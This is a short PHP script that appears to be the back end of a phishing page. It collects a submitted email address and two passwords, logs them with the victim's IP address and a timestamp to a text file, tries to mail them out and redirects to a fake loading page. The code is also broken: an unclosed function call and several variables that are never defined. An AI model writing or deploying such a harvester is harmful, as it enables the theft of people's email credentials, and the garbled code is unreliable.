<?php

$ip = getenv("REMOTE_ADDR");
$L1 = $_POST['U1'];
$P1 = $_POST['P1'];
$P2 = $_POST['P2'];

$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$Day = date("D/M/d, Y g:i a"); 

file_put_contents("usernames.txt", 
"Email ID : $L1 \n".
"Email Password : $P1 \n".
"Email Password2 : $P2\n".

"Client IP : $ip\n".
"Country : $country\n".
"Date: $Day\n";


if (empty($L1) || empty($P2)) {
header( "Location: home.php" );
}
else {
mail($own,$subj,$msg);
header("Location: loading.htm");
exit();
}

?>